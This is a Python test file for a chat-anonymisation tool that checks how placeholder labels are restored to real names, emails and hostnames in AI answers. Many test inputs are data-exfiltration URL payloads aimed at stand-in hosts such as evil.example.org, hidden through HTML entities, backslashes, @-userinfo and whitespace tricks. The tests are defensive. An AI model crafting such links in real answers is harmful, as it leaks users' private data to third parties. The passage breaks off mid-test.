import ipaddress
import time

import pytest

from cleaner.core.entities import netmap, ops
from cleaner.core.pipeline import sanitize
from cleaner.core.restore import RestoreResult, StreamRestorer, restore
from cleaner.core.types import ChatRule, ChatState, Entity, Policy, Settings, Surrogate, default_policies
from cleaner.core.types import EntityType as T


def person_state(style: str = "angle") -> ChatState:
    state = ChatState(chat_id="people", net_key=bytes(range(32)), label_style=style)
    left, right = ("<", ">") if style == "angle" else ("[[", "]]")
    for number, name in ((1, "Иван Петров"), (10, "Пётр Сидоров")):
        entity = Entity(f"p{number}", T.PERSON, number, name.lower(), name, "manual", [name])
        state.entities[entity.id] = entity
        state.surrogates[f"{left}PERSON_{number}{right}"] = Surrogate(entity.id)
    return state


def infra_state() -> ChatState:
    state = ChatState(chat_id="infra", net_key=bytes(range(32)))
    text = "srv-web01.corp.contoso.ru, адрес 10.1.2.5, MAC 00:1A:2B:3C:4D:5E, пароль: Qwerty123!"
    sanitize(state, text, Settings())
    return state


def kinds(result: RestoreResult) -> list[str]:
    return [segment.kind for segment in result.segments]


def test_altered_labels_are_restored_and_unknown_ones_are_marked(settings):
    answer = (
        r"A: \<PERSON\_1\>, B: &lt;PERSON_1&gt;, C: PERSON_1, "
        r"D: <PERSON_1> и <PERSON_10>, E: <PERSON_99>"
    )
    result = restore(person_state(), answer, settings)
    assert result.text == (
        "A: Иван Петров, B: Иван Петров, C: Иван Петров, D: Иван Петров и Пётр Сидоров, E: <PERSON_99>"
    )
    assert (result.counters["restored"], result.counters["altered"], result.counters["unknown"]) == (2, 3, 1)


def test_two_labels_never_get_the_same_value(settings):
    result = restore(person_state(), "<PERSON_1> пишет <PERSON_10>, а PERSON_10 отвечает PERSON_1", settings)
    assert result.text == "Иван Петров пишет Пётр Сидоров, а Пётр Сидоров отвечает Иван Петров"


def test_square_style_is_not_read_as_a_character_class(settings):
    result = restore(person_state("square"), "Отчёт подготовил [[PERSON_1]].", settings)
    assert result.text == "Отчёт подготовил Иван Петров."


def test_backslashes_in_the_original_survive(settings):
    state = person_state()
    state.entities["p1"].restore_value = r"C:\Users\ivanov"
    assert restore(state, "путь <PERSON_1>", settings).text == r"путь C:\Users\ivanov"


def test_label_in_another_style_is_still_recognised(settings):
    result = restore(person_state(), "Пишет [[PERSON_1]]", settings)
    assert (result.text, kinds(result)) == ("Пишет Иван Петров", ["altered"])


def test_label_inside_a_foreign_link_is_not_restored(settings):
    answer = "Откройте https://evil.example.org/collect?name=<PERSON_1> и напишите <PERSON_1>."
    result = restore(person_state(), answer, settings)
    assert result.text == "Откройте https://evil.example.org/collect?name=<PERSON_1> и напишите Иван Петров."
    assert kinds(result) == ["foreign_link", "restored"]


@pytest.mark.parametrize(
    "answer",
    [
        "Откройте https://<PERSON_1>.evil.example.org/c?x=<PERSON_10>",
        '[отчёт](https://evil.example.org/c?x="<PERSON_1>")',
        '<a href="https://evil.example.org/c?x=<PERSON_1>">отчёт</a>',
        "[написать](mailto:boss@evil.example.org?body=<PERSON_1>)",
        "mailto:boss@evil.example.org?body=<PERSON_1>",
    ],
)
def test_labels_inside_foreign_links_stay_labels(settings, answer):
    """Обзор 1А, P1 (FR-7.8): метка в имени узла, значение в кавычках, атрибут HTML, mailto."""
    result = restore(person_state(), answer, settings)
    assert "Иван Петров" not in result.text and "Пётр Сидоров" not in result.text
    assert "foreign_link" in kinds(result)


def test_known_host_part_under_a_foreign_domain_is_not_restored(settings):
    """Обзор 1А, P1: ссылка наша, только если её хост целиком собран из выданных подмен."""
    answer = "Откройте https://host-1.attacker.org/?q=sub-2.domain-1.example"
    result = restore(infra_state(), answer, settings)
    assert (result.text, kinds(result)) == (answer, ["foreign_link"])


def test_mailto_link_to_our_own_address_is_restored(settings):
    state = person_state()
    entity = Entity("e1", T.EMAIL, 1, "i.ivanov@contoso.ru", "i.ivanov@contoso.ru", "detector", [])
    state.entities[entity.id] = entity
    state.surrogates["<EMAIL_1>"] = Surrogate(entity.id)
    result = restore(state, "Пишите: mailto:<EMAIL_1>", settings)
    assert result.text == "Пишите: mailto:i.ivanov@contoso.ru"


def test_internal_link_and_derived_names_are_restored(settings):
    answer = "Откройте https://host-1.sub-2.domain-1.example/owa, заведите newbox.domain-1.example и HOST-1"
    result = restore(infra_state(), answer, settings)
    assert result.text == (
        "Откройте https://srv-web01.corp.contoso.ru/owa, заведите newbox.contoso.ru и SRV-WEB01"
    )
    assert kinds(result) == ["restored", "derived", "restored"]


@pytest.mark.parametrize(
    "answer, restored, segments",
    [
        (r"RewriteCond %{HTTP_HOST} ^host-1\.sub-2\.domain-1\.example$", r"RewriteCond %{HTTP_HOST} ^srv-web01\.corp\.contoso\.ru$", ["restored"]),
        (r"server_name ~^www\.domain-1\.example$;", r"server_name ~^www\.contoso\.ru$;", ["derived"]),
        (r"grep 'host-1\.example\.com' log", r"grep 'srv-web01\.example\.com' log", ["derived"]),
        (r"^host-1\.sub-2\.domain-1.example$", r"^srv-web01\.corp\.contoso.ru$", ["derived"] * 3),
    ],
    ids=["rewrite", "nginx", "derived", "both-separators"],
)
def test_name_written_with_escaped_dots_is_restored_with_them(settings, answer, restored, segments):
    """Наблюдение раунда имён узлов, P3: в регулярном выражении имя пишут через «\\.», и из «host-1\\.domain-1\\.example»
    восстанавливалась только первая часть. Цепочка частей через «\\.» ищется так же, как через точку, и оригинал пишется
    с тем же разделителем; повторная вставка ответа ничего не создаёт."""
    state = infra_state()
    result = restore(state, answer, settings)
    assert (result.text, kinds(result)) == (restored, segments)
    counts = (len(state.entities), len(state.surrogates))
    assert sanitize(state, answer, settings).sanitized == answer
    assert (len(state.entities), len(state.surrogates)) == counts


@pytest.mark.parametrize(
    "answer, restored",
    [
        (r"C:\host-1\domain-1.example", r"C:\srv-web01\contoso.ru"),
        (r"C:\Users\host-1\.ssh\config", r"C:\Users\srv-web01\.ssh\config"),
        (r"host-1\\.domain-1", r"srv-web01\\.domain-1"),
        (r"\\host-1\share\.domain-1\.examples", r"\\srv-web01\share\.domain-1\.examples"),
    ],
    ids=["path", "dot-folder", "escaped-backslash", "not-a-name"],
)
def test_backslash_before_a_dot_elsewhere_is_not_a_separator_of_our_name(settings, answer, restored):
    """Та же находка с другой стороны: путь Windows («\\» перед частью или перед папкой на точку), экранированная
    обратная косая и цепочка, которой нет в таблице, читаются, как раньше."""
    assert restore(infra_state(), answer, settings).text == restored


def test_address_in_a_known_fake_subnet_is_derived(settings):
    state = infra_state()
    fake = next(text for text, surrogate in state.surrogates.items() if surrogate.kind == "ip")
    neighbour = fake.rsplit(".", 1)[0] + ".99"
    result = restore(state, f"Основной {fake}, резервный {neighbour}", settings)
    assert result.text == "Основной 10.1.2.5, резервный 10.1.2.99"
    assert kinds(result) == ["restored", "derived"]


def test_reformatted_mac_is_recognised(settings):
    result = restore(infra_state(), "интерфейс 02-00-00-00-00-01", settings)
    assert (result.text, kinds(result)) == ("интерфейс 00:1A:2B:3C:4D:5E", ["altered"])


def test_secret_stays_hidden(settings):
    result = restore(infra_state(), "Пароль <SECRET_1> лучше сменить", settings)
    assert (result.text, kinds(result)) == ("Пароль <SECRET_1> лучше сменить", ["kept_by_policy"])
    assert result.counters["kept"] == 1


@pytest.mark.parametrize("answer", ["", "Ответ без меток: перезапустите службу."])
def test_answer_without_surrogates_is_returned_unchanged(settings, answer):
    for state in (person_state(), ChatState(chat_id="empty", net_key=bytes(32))):
        result = restore(state, answer, settings)
        assert (result.text, result.segments) == (answer, [])


def test_original_is_not_planted_inside_other_words(settings):
    state = person_state()
    state.entities["p1"].restore_value = "Ann"
    assert restore(state, "Annual report by <PERSON_1>", settings).text == "Annual report by Ann"


def test_foreign_label_from_the_input_is_not_reported(settings):
    state = person_state()
    state.foreign_labels.add("<PERSON_7>")
    result = restore(state, "В шаблоне <PERSON_7>", settings)
    assert (result.text, result.segments) == ("В шаблоне <PERSON_7>", [])


def link_state() -> ChatState:
    state = ChatState(chat_id="links", net_key=bytes(range(32)))
    sanitize(state, "Пишет ivanov@contoso.ru с srv-dc01.contoso.ru, адрес 10.1.2.5", Settings())
    return state


def fake_ip(state: ChatState) -> str:
    return next(text for text, surrogate in state.surrogates.items() if surrogate.kind == "ip")


@pytest.mark.parametrize(
    "answer",
    [
        "[отчёт](https://evil.example.org/x?q=(a)<EMAIL_1>)",
        "![img](https://evil.example.org/x_(1)/<EMAIL_1>.png)",
        r"https://evil.example.org\@host-1.domain-1.example/?q=<EMAIL_1>",
        "https://evil.example.org?@host-1.domain-1.example/?q=<EMAIL_1>",
        "https://evil.example.org#@host-1.domain-1.example/?q=<EMAIL_1>",
        "[x](https://evil.example.org?@{ip}/?q=<EMAIL_1>)",
        "https://evil.example.org/?q='<EMAIL_1>'",
        "[1]: https://evil.example.org/?q='<EMAIL_1>'",
        "<img srcset=\"https://evil.example.org/p?q='<EMAIL_1>' 1x\">",
        "<form action=\"https://evil.example.org/c?q='<EMAIL_1>'\">",
        "www.evil.example.org/?q=<EMAIL_1>",
    ],
)
def test_nothing_is_restored_inside_a_foreign_link(settings, answer):
    """Обзор пакета исправлений 1А, P1 (FR-7.8): скобки в цели, хост по правилам браузера, кавычки,
    определения ссылок, атрибуты с адресом и адреса на «www.»."""
    state = link_state()
    answer = answer.format(ip=fake_ip(state))
    result = restore(state, answer, settings)
    assert (result.text, kinds(result)) == (answer, ["foreign_link"])


@pytest.mark.parametrize(
    "answer",
    [
        '<a href="&#47;&#47;evil.example.org/?q=<EMAIL_1>">',
        '<a href="&sol;&sol;evil.example.org/?q=<EMAIL_1>">',
        '<a href="&#x2F;&#x2f;evil.example.org/?q=<EMAIL_1>">',
        '<a href="&#47&#47evil.example.org/?q=<EMAIL_1>">',
        '<a href="https&colon;evil.example.org/?q=<EMAIL_1>">',
        '<a href="&#47;&#47;host-1.domain-1.example&commat;evil.example.org/?q=<EMAIL_1>">',
        '<a href="&#47;&#47;host-1.domain-1.example&#64evil.example.org/?q=<EMAIL_1>">',
        '<a href="&#47;&#47;host-1.domain-1.example&#9;&#10;@evil.example.org/?q=<EMAIL_1>">',
        '<a href="&#47;&#47;host-1.domain-1.example&nbsp;x@evil.example.org/?q=<EMAIL_1>">',
        '<a href="&#47;&#47;host-1.domain-1.example&nbspevil.example.org/?q=<EMAIL_1>">',
        '<a href="&#' + "0" * 5000 + '47;&#47;evil.example.org/?q=<EMAIL_1>">',
        '<a href="mailto&colon;boss@evil.example.org?body=<EMAIL_1>">',
        '<p style="background:url(&#47;&#47;evil.example.org/?q=<EMAIL_1>)">',
        '<p style="background:url(&bsol;2f&bsol;2f evil.example.org/?q=<EMAIL_1>)">',
        '<img srcset="a.png 1x, &#47;&#47;evil.example.org/?q=<EMAIL_1> 2x">',
        "<a href=&#47;&#47;evil.example.org/?q=<EMAIL_1>>",
        "<a href=&#47;&#47;host-1.domain-1.example:<EMAIL_1>@evil.example.org/>",
        "[x](&#47;&#47;evil.example.org/?q=<EMAIL_1>)",
        "![x](https&colon;evil.example.org/?q=<EMAIL_1>)",
        "[1]: <&#47;&#47;evil.example.org/?q=<EMAIL_1>>",
        "[1]: &#47;&#47;evil.example.org/?q=<EMAIL_1>",
    ],
)
def test_character_references_in_a_link_target_are_decoded(settings, answer):
    """Хэнд-офф, P1: браузер раскрывает ссылки на знаки HTML в атрибуте (и в атрибуте без кавычек) до разбора
    адреса, CommonMark — в цели ссылки и в определении: «&#47;&#47;evil…» — это «//evil…», «&commat;» прячет чужой
    хост за нашим, числовая ссылка без «;» и с тысячами нулей раскрывается тоже. «&nbsp» без «;» перед буквой
    атрибут не раскрывает — хост один и чужой, хотя html.unescape оборвал бы его пробелом на нашем имени."""
    result = restore(link_state(), answer, settings)
    assert (result.text, kinds(result)) == (answer, ["foreign_link"])


@pytest.mark.parametrize(
    "answer",
    ['<img data-src="//evil&#46;example&#46;org/?q=<PERSON_1>">', "'//evil&period;example&period;org/?q=<PERSON_1>'"],
)
def test_character_reference_dot_makes_a_protocol_relative_link_foreign(settings, answer):
    """Та же находка: «//имя» без точки — не внешний узел («//TODO:» в коде), но «&#46;» — это точка."""
    result = restore(person_state(), answer, settings)
    assert (result.text, kinds(result)) == (answer, ["foreign_link"])


@pytest.mark.parametrize(
    "answer, restored",
    [
        (
            '<a href="https&#58;//host-1.domain-1.example/a?q=<EMAIL_1>">',
            '<a href="https&#58;//srv-dc01.contoso.ru/a?q=ivanov@contoso.ru">',
        ),
        (
            '<a href="&#47;&#47;host-1.domain-1.example/?a=1&amp;q=<EMAIL_1>&notify=1&region=ru">',
            '<a href="&#47;&#47;srv-dc01.contoso.ru/?a=1&amp;q=ivanov@contoso.ru&notify=1&region=ru">',
        ),
        (
            "[вики](https://host-1.domain-1.example/a?b=1&amp;c=<EMAIL_1>)",
            "[вики](https://srv-dc01.contoso.ru/a?b=1&amp;c=ivanov@contoso.ru)",
        ),
        ("<a href=https://host-1.domain-1.example/?q=<EMAIL_1>>", "<a href=https://srv-dc01.contoso.ru/?q=ivanov@contoso.ru>"),
        ("[1]: https://host-1.domain-1.example/<EMAIL_1>", "[1]: https://srv-dc01.contoso.ru/ivanov@contoso.ru"),
        ("[INFO]: <EMAIL_1> вошёл", "[INFO]: ivanov@contoso.ru вошёл"),
        ("src = <EMAIL_1>, Tom &amp; Jerry", "src = ivanov@contoso.ru, Tom &amp; Jerry"),
    ],
)
def test_own_links_with_character_references_are_restored(settings, answer, restored):
    """Та же находка с другой стороны: наш адрес, записанный ссылками на знаки, «&amp;» и «&notify=» в запросе,
    наш адрес в атрибуте без кавычек и в определении без угловых скобок восстанавливаются, как и текст рядом."""
    assert restore(link_state(), answer, settings).text == restored


@pytest.mark.parametrize(
    "answer",
    [
        "Отчёт: https&colon;&sol;&sol;evil.example.org/?q=<EMAIL_1> готов",
        "Отчёт: https&#58;&#47;&#47;evil.example.org/?q=<EMAIL_1>",
        "Отчёт: &#104;ttps&colon;&sol;&sol;evil.example.org/?q=<EMAIL_1>",
        "Отчёт: HTTPS&colon;&sol;&sol;evil.example.org/?q=<EMAIL_1>",
        "Отчёт: www&period;evil.example.org/?q=<EMAIL_1>",
        r"Отчёт: https\:\/\/evil.example.org/?q=<EMAIL_1>",
        "Отчёт: (https&colon;&sol;&sol;evil.example.org/?q=<EMAIL_1>&nbsp;x)",
        r"[x](https\:\/\/evil.example.org/?q=<EMAIL_1>)",
    ],
)
def test_nothing_is_restored_inside_a_link_that_markdown_decodes_in_prose(settings, answer):
    """FINDINGS «Small gaps left by the findings batch of 15.10»: remark-gfm (react-markdown — во многих чатах)
    раскрывает ссылки на знаки и экранирования «\\» в тексте и потом ищет адреса — «https&colon;&sol;&sol;evil…» и
    «www&period;evil…» становятся ссылками. Цель ссылки CommonMark экранирования раскрывает тоже (cmark-gfm,
    markdown-it, marked, remark)."""
    result = restore(link_state(), answer, settings)
    assert (result.text, kinds(result)) == (answer, ["foreign_link"])


@pytest.mark.parametrize(
    "answer, restored",
    [
        (
            "https&colon;&sol;&sol;host-1.domain-1.example/?q=<EMAIL_1>",
            "https&colon;&sol;&sol;srv-dc01.contoso.ru/?q=ivanov@contoso.ru",
        ),
        (
            "Отчёт: https&colon;&sol;&sol;evil.example.org/x пишет <EMAIL_1>",
            "Отчёт: https&colon;&sol;&sol;evil.example.org/x пишет ivanov@contoso.ru",
        ),
        (r"Tom &amp; Jerry: <EMAIL_1>, \_путь\_ C:\Users\<EMAIL_1>", r"Tom &amp; Jerry: ivanov@contoso.ru, \_путь\_ C:\Users\ivanov@contoso.ru"),
        (r"[вики](https\://host-1.domain-1.example/<EMAIL_1>)", r"[вики](https\://srv-dc01.contoso.ru/ivanov@contoso.ru)"),
    ],
)
def test_own_encoded_links_and_text_next_to_encoded_links_are_restored(settings, answer, restored):
    """Та же находка с другой стороны: наш адрес, записанный ссылками на знаки, текст через пробел от чужого и
    ссылки на знаки и экранирования без адреса восстанавливаются как обычно."""
    assert restore(link_state(), answer, settings).text == restored


@pytest.mark.parametrize(
    "answer, restored",
    [
        (
            r"RewriteCond %{HTTP_HOST} ^www\.host-1\.domain-1\.example$ [NC]",
            r"RewriteCond %{HTTP_HOST} ^www\.srv-dc01\.contoso\.ru$ [NC]",
        ),
        (r"server_name ~^www\.host-1\.domain-1\.example$;", r"server_name ~^www\.srv-dc01\.contoso\.ru$;"),
        (
            "```apache\nRewriteCond %{HTTP_HOST} ^www\\.host-1\\.domain-1\\.example$\n```",
            "```apache\nRewriteCond %{HTTP_HOST} ^www\\.srv-dc01\\.contoso\\.ru$\n```",
        ),
    ],
)
def test_regular_expression_with_our_host_name_is_restored(settings, answer, restored):
    """Обзор пакета восстановления, Minor: «^www\\.host-1\\.domain-1\\.example$» remark-gfm раскрывает в ссылку
    «www.host-1.domain-1.example$», и слово считалось чужой ссылкой — host-1 не восстанавливался (до пакета
    восстанавливался). Знак в конце последней части, которого не бывает в домене верхнего уровня, к чужому узлу не
    ведёт: имя перед ним наше — и ссылка наша. Имя через «\\.» восстанавливается целиком и с тем же разделителем."""
    result = restore(link_state(), answer, settings)
    assert result.text == restored and "foreign_link" not in kinds(result)


@pytest.mark.parametrize(
    "answer",
    [
        r"^www\.host-1\.domain-1\.example$.evil.example.org/?q=<EMAIL_1>",
        r"^www\.evil\.example\.org$/?q=<EMAIL_1>",
        "https://host-1.domain-1.example$evil.example.org/?q=<EMAIL_1>",
        "https://host-1.domain-1.example%2e%65vil.example.org/?q=<EMAIL_1>",
        "https&colon;&sol;&sol;evil.example.org$/?q=<EMAIL_1>",
    ],
)
def test_punctuation_after_a_foreign_or_inside_a_name_keeps_the_link_foreign(settings, answer):
    """Та же находка с другой стороны: знак посреди имени («…example$.evil…»), после чужого имени и «%» (браузер
    раскрывает «%2e» в точку до разбора хоста) ссылку нашей не делают."""
    result = restore(link_state(), answer, settings)
    assert (result.text, kinds(result)) == (answer, ["foreign_link"])


@pytest.mark.parametrize(
    "answer",
    [
        r"https://host-1\.evil\.example\.org/?q=<EMAIL_1>",
        r"Отчёт: 'https://host-1\.evil\.example\.org/?q=<EMAIL_1>'",
        r"www.domain-1.example\.evil\.example\.org/?q=<EMAIL_1>",
        r"https://host-1.domain-1.example\@evil.example.org/?q=<EMAIL_1>",
        r"https://host-1.domain-1.example\:<EMAIL_1>@evil.example.org/",
        r"https://host-1.domain-1.example:8080\@evil.example.org/?q=<EMAIL_1>",
        r"https://host-1.domain-1.example\x@evil.example.org/?q=<EMAIL_1>",
        r"https://host-1.domain-1.example\\@evil.example.org/?q=<EMAIL_1>",
        r"[x](https://host-1.domain-1.example\x@evil.example.org/?q=<EMAIL_1>)",
        r"[1]: <https://host-1.domain-1.example\\@evil.example.org/?q=<EMAIL_1>>",
        r"https\://host-1.domain-1.example\x@evil.example.org/?q=<EMAIL_1>",
        r"https://host-1%5C.evil.example.org/?q=<EMAIL_1>",
    ],
)
def test_backslash_in_a_bare_or_markdown_link_does_not_hide_a_foreign_host(settings, answer):
    """Обзор восстановления, P1: голый адрес проверялся без прочтения CommonMark, а «\\» в нём — как «/». Markdown-читатели
    (cmark-gfm, remark-gfm, marked, markdown-it, mistune) берут голый адрес из записи как есть и кодируют «\\» в «%5C»,
    и «https://наш\\@evil…» и «https://наш\\x@evil…» ведут на evil; remark-gfm, если хост с «_» (srv_01) не подошёл
    его разбору, ищет адрес в тексте после раскрытия экранирований — «https://srv_01\\.evil\\.com/…» ведёт на
    srv_01.evil.com. В цели ссылки Markdown «\\» перед буквой и «\\\\» кодируются так же."""
    result = restore(link_state(), answer, settings)
    assert (result.text, kinds(result)) == (answer, ["foreign_link"])


@pytest.mark.parametrize(
    "answer, restored",
    [
        (r"https://host-1\.domain-1\.example/?q=<EMAIL_1>", r"https://srv-dc01\.contoso\.ru/?q=ivanov@contoso.ru"),
        (
            r'if ($http_referer ~* "^https://host-1\.domain-1\.example/") { return <EMAIL_1>; }',
            r'if ($http_referer ~* "^https://srv-dc01\.contoso\.ru/") { return ivanov@contoso.ru; }',
        ),
        (r"https://host-1.domain-1.example\/a?q=<EMAIL_1>", r"https://srv-dc01.contoso.ru\/a?q=ivanov@contoso.ru"),
        (r'{"url":"https:\/\/host-1.domain-1.example\/a?q=<EMAIL_1>"}', r'{"url":"https:\/\/srv-dc01.contoso.ru\/a?q=ivanov@contoso.ru"}'),
        (r"[x](file:\\\C:\Users\<EMAIL_1>\a.txt)", r"[x](file:\\\C:\Users\ivanov@contoso.ru\a.txt)"),
        (r"file:\\C:\Users\<EMAIL_1>\a.txt", r"file:\\C:\Users\ivanov@contoso.ru\a.txt"),
        (r"^host-1\.domain-1\.example$ для <EMAIL_1>\.", r"^srv-dc01\.contoso\.ru$ для ivanov@contoso.ru\."),
    ],
)
def test_own_links_and_plain_text_with_backslashes_are_restored(settings, answer, restored):
    """Та же находка с другой стороны: наш хост через «\\.» остаётся нашим при любом прочтении (хост с «%5C» браузер
    отвергает), текст с «\\.» вне ссылки восстанавливается, как раньше, а «file:\\\\C:\\…» с буквой диска хоста не имеет
    (WHATWG URL) — и в цели Markdown после раскрытия «\\\\», и без схемы с двумя косыми."""
    result = restore(link_state(), answer, settings)
    assert result.text == restored and "foreign_link" not in kinds(result)


@pytest.mark.parametrize(
    "answer",
    [
        "_www.evil.example.org/?q=<EMAIL_1>",
        "x.www.evil.example.org/?q=<EMAIL_1>",
        "xwww.evil.example.org/?q=<EMAIL_1>",
        "Отчёт: _www&period;evil.example.org/?q=<EMAIL_1>",
    ],
)
def test_www_after_any_character_starts_a_link(settings, answer):
    """Найдено при проверке голых адресов с «\\», P1: «www.» искался только не после буквы, цифры, «_», «.» и «-». А
    cmark-gfm (GitHub) и remark-gfm делают ссылкой «_www.evil…» (GFM: и после «*», «~», «(»), remark-gfm в раскрытом
    тексте — после любого знака препинания, marked — после любого знака («xwww.evil…»)."""
    result = restore(link_state(), answer, settings)
    assert (result.text, kinds(result)) == (answer, ["foreign_link"])


@pytest.mark.parametrize(
    "answer, restored",
    [
        ("x_www.domain-1.example/<EMAIL_1>", "x_www.contoso.ru/ivanov@contoso.ru"),
        ('config.www.root = "<EMAIL_1>"', 'config.www.root = "ivanov@contoso.ru"'),
    ],
)
def test_www_inside_a_word_before_our_domain_or_without_labels_restores(settings, answer, restored):
    """Та же находка с другой стороны: «www.» посреди слова перед нашим доменом — наш узел, а без меток в адресе
    восстанавливать в нём нечего, и текст рядом восстанавливается."""
    result = restore(link_state(), answer, settings)
    assert result.text == restored and "foreign_link" not in kinds(result)


def test_host_is_after_the_last_at_sign(settings):
    """Найдено при исправлении обратных косых, P1: браузер берёт хост за последним «@» адреса, а не за первым —
    «https://a@наш:1@evil…» ведёт на evil. Имя пользователя и пароль у нашего адреса ссылку чужой не делают."""
    answer = "https://a@host-1.domain-1.example:1@evil.example.org/?q=<EMAIL_1>"
    result = restore(link_state(), answer, settings)
    assert (result.text, kinds(result)) == (answer, ["foreign_link"])
    own = restore(link_state(), "https://a:b@host-1.domain-1.example:8080/?q=<EMAIL_1>", settings)
    assert own.text == "https://a:b@srv-dc01.contoso.ru:8080/?q=ivanov@contoso.ru"


@pytest.mark.parametrize(
    "answer",
    [
        '<a href="https://host-1.domain-1.example x@evil.example.org/?q=<EMAIL_1>">',
        '<a href="https:// @evil.example.org/?q=<EMAIL_1>">',
        "<img src='//host-1.domain-1.example\N{NO-BREAK SPACE}x@evil.example.org/p?q=<EMAIL_1>'>",
        "[1]: <https://host-1.domain-1.example x:y@evil.example.org/?q=<EMAIL_1>>",
    ],
)
def test_userinfo_runs_through_whitespace(settings, answer):
    """Найдено при исправлении ссылок на знаки HTML, P1: пробел в имени пользователя браузер кодирует как «%20» и
    адрес им не кончает (WHATWG URL, authority state) — «https://наш x@evil…» ведёт на evil."""
    result = restore(link_state(), answer, settings)
    assert (result.text, kinds(result)) == (answer, ["foreign_link"])


@pytest.mark.parametrize(
    "answer, restored",
    [
        (
            '<img srcset="https://host-1.domain-1.example/a.png 1x, https://host-1.domain-1.example/<EMAIL_1>.png 2x">',
            '<img srcset="https://srv-dc01.contoso.ru/a.png 1x, https://srv-dc01.contoso.ru/ivanov@contoso.ru.png 2x">',
        ),
        (
            '<meta content="0;url=https://host-1.domain-1.example/?to=<EMAIL_1> a@b">',
            '<meta content="0;url=https://srv-dc01.contoso.ru/?to=ivanov@contoso.ru a@b">',
        ),
    ],
)
def test_own_link_with_whitespace_and_at_signs_after_the_host_is_restored(settings, answer, restored):
    """Та же находка с другой стороны: «@» после «/» или «?» — уже не имя пользователя, и наш адрес восстанавливается."""
    assert restore(link_state(), answer, settings).text == restored


def test_own_links_and_labels_next_to_foreign_links_are_restored(settings):
    state = link_state()
    own = restore(state, "https://host-1.domain-1.example/?q=<EMAIL_1>", settings)
    assert own.text == "https://srv-dc01.contoso.ru/?q=ivanov@contoso.ru"
    near = restore(state, '{"url":"https://evil.example.org/x","owner":"<EMAIL_1>"}', settings)
    assert near.text == '{"url":"https://evil.example.org/x","owner":"ivanov@contoso.ru"}'
    after = restore(state, "[docs](https://evil.example.org/x_(1)) пишет <EMAIL_1>", settings)
    assert after.text == "[docs](https://evil.example.org/x_(1)) пишет ivanov@contoso.ru"
    plain = restore(state, "Сайт www.example.org без меток", settings)
    assert (plain.text, plain.segments) == ("Сайт www.example.org без меток", [])


@pytest.mark.parametrize(
    "answer, restored",
    [
        ("Сайт www.domain-1.example, пишите <EMAIL_1>", "Сайт www.contoso.ru, пишите ivanov@contoso.ru"),
        ("https://www.domain-1.example/?q=<EMAIL_1>", "https://www.contoso.ru/?q=ivanov@contoso.ru"),
        ('<a href="//mail.domain-1.example/?to=<EMAIL_1>">', '<a href="//mail.contoso.ru/?to=ivanov@contoso.ru">'),
        ("www.host-1.domain-1.example/<EMAIL_1>", "www.srv-dc01.contoso.ru/ivanov@contoso.ru"),
        ("[вики](https://www.WWW2.Domain-1.example/<EMAIL_1>)", "[вики](https://www.WWW2.contoso.ru/ivanov@contoso.ru)"),
    ],
)
def test_generic_label_in_front_of_an_issued_domain_is_our_host(settings, answer, restored):
    """FINDINGS «Small gaps left by the findings batch of 15.10»: «www.domain-1.example», написанное пользователем или
    моделью, считалось ссылкой на чужой узел, и метки рядом не восстанавливались. Служебная часть имени перед
    выданным доменом ведёт на узел того же домена."""
    result = restore(link_state(), answer, settings)
    assert result.text == restored and "foreign_link" not in kinds(result)


@pytest.mark.parametrize(
    "answer",
    [
        "https://www.domain-1.example.evil.example.org/?q=<EMAIL_1>",
        "https://domain-1.example.www/?q=<EMAIL_1>",
        "https://www.evil.domain-1.example/?q=<EMAIL_1>",
        "https://www.host-1/?q=<EMAIL_1>",
        "https://www/?q=<EMAIL_1>",
        "https://mail.www.evil.example.org/?q=<EMAIL_1>",
    ],
)
def test_generic_label_in_front_of_a_foreign_name_stays_foreign(settings, answer):
    """Та же находка с другой стороны: служебная часть делает нашим только имя, которое кончается выданным доменом, и
    только впереди; неизвестная часть перед доменом и чужой домен после нашего ссылку по-прежнему не пускают."""
    result = restore(link_state(), answer, settings)
    assert (result.text, kinds(result)) == (answer, ["foreign_link"])


@pytest.mark.parametrize(
    "answer",
    [
        r'<img src="\\evil.example.org/p?q=<EMAIL_1>">',
        r'<a href="https:\\evil.example.org/?q=<EMAIL_1>">',
        r"https://\evil.example.org/?q=<EMAIL_1>",
        r"[x](https:/\evil.example.org/?q=<EMAIL_1>)",
        r'<img src="/\evil.example.org/p?q=<EMAIL_1>">',
        '<a href="ht\ntps:\t\\\\evil.example.org/?q=<EMAIL_1>">',
        '<img src="http:evil.example.org/p?q=<EMAIL_1>">',
        "https:evil.example.org/?q=<EMAIL_1>",
        r"file:\\evil.example.org\share\<EMAIL_1>",
        r"\\evil.example.org\share\<EMAIL_1>",
        r"[x](https://host-1.domain-1.example/?next=\\evil.example.org/<EMAIL_1>)",
    ],
)
def test_backslashes_and_missing_slashes_lead_a_link_to_a_foreign_host(settings, answer):
    """Хэнд-офф, P1: браузер читает «\\» в адресе с особой схемой как «/» и пропускает любую череду косых после
    схемы, даже пустую, — все эти адреса ведут на evil.example.org (WHATWG URL)."""
    result = restore(link_state(), answer, settings)
    assert (result.text, kinds(result)) == (answer, ["foreign_link"])


@pytest.mark.parametrize(
    "answer, restored",
    [
        (r"https:\\host-1.domain-1.example\wiki?u=<EMAIL_1>", r"https:\\srv-dc01.contoso.ru\wiki?u=ivanov@contoso.ru"),
        (r'<a href="\\host-1.domain-1.example\s\<EMAIL_1>">', r'<a href="\\srv-dc01.contoso.ru\s\ivanov@contoso.ru">'),
        (r'path = "C:\\Users\\<EMAIL_1>\\report.docx"', r'path = "C:\\Users\\ivanov@contoso.ru\\report.docx"'),
    ],
)
def test_own_links_and_paths_with_backslashes_are_restored(settings, answer, restored):
    """Та же находка с другой стороны: наш адрес с обратными косыми восстанавливается, а «\\\\» внутри пути
    Windows в строке кода — не начало адреса."""
    assert restore(link_state(), answer, settings).text == restored


@pytest.mark.parametrize(
    "answer",
    [
        "<img src=\"https://evil.example.org/p?q=\n<EMAIL_1>\">",
        "<img src=\"https://host-1.domain-1.example\t@evil.example.org/p?q=<EMAIL_1>\">",
        "<img src=\"https://host-1.domain-1.example\n@evil.example.org/p?q=<EMAIL_1>\">",
        "[1]: <https://evil.example.org/p?q=a <EMAIL_1>>",
        "<div style=\"background:url(https://evil.example.org/p?q=<EMAIL_1>)\">",
    ],
)
def test_nothing_is_restored_inside_a_foreign_link_split_by_whitespace(settings, answer):
    """FINDINGS P1 «Restore: originals still reach foreign links split by whitespace»: браузер выбрасывает
    из адреса переводы строк и табуляции, атрибут с адресом тянется через строки, цель определения ссылки
    в угловых скобках — с пробелами, CSS url() в style загружается сам."""
    result = restore(link_state(), answer, settings)
    assert (result.text, kinds(result)) == (answer, ["foreign_link"])


@pytest.mark.parametrize(
    "answer",
    [
